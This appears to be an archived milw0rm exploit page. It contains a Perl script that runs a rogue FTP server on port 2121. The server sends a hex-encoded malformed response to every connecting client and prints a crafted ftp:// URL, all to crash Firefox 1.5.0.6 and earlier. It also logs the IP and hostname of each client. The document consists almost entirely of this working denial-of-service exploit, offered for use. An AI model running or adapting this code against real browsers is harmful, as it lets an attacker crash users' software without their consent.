<html><head><title>Mozilla Firefox <= 1.5.0.6 (FTP Request) Remote Denial of Service Exploit</title></head><pre>#!/usr/bin/perl
#author: tomas kempinsky

use strict;
use Socket;

my $port = shift || 2121;
my $proto = getprotobyname('tcp');
my $payload =
&quot;\x32\x32\x30\x20\x5a\x0d\x0a\x33&quot;.
&quot;\x33\x31\x20\x5a\x0d\x0a\x35\x30&quot;.
&quot;\x30\x20\x44\x6f\x53\x0d\x0a\x35&quot;.
&quot;\x30\x30\x20\x5a\x0d\x0a&quot;;


socket(SERVER, PF_INET, SOCK_STREAM, $proto) or die &quot;socket: $!&quot;;
setsockopt(SERVER, SOL_SOCKET, SO_REUSEADDR, 1) or die &quot;setsock: $!&quot;;

my $paddr = sockaddr_in($port, INADDR_ANY);

bind(SERVER, $paddr) or die &quot;bind: $!&quot;;
listen(SERVER, SOMAXCONN) or die &quot;listen: $!&quot;;
print &quot;ftp://D:oS@\x0localhost:2121/\n&quot;;

my $client_addr;
while ($client_addr = accept(CLIENT, SERVER)) {
       # find out who connected
       my ($client_port, $client_ip) = sockaddr_in($client_addr);
       my $client_ipnum = inet_ntoa($client_ip);
       my $client_host = gethostbyaddr($client_ip, AF_INET);
       print &quot;: $client_host&quot;, &quot;[$client_ipnum]\n&quot;;
       # send them a message, close connection
       print CLIENT $payload;
       close CLIENT;
}

# milw0rm.com [2006-08-22]</pre></html>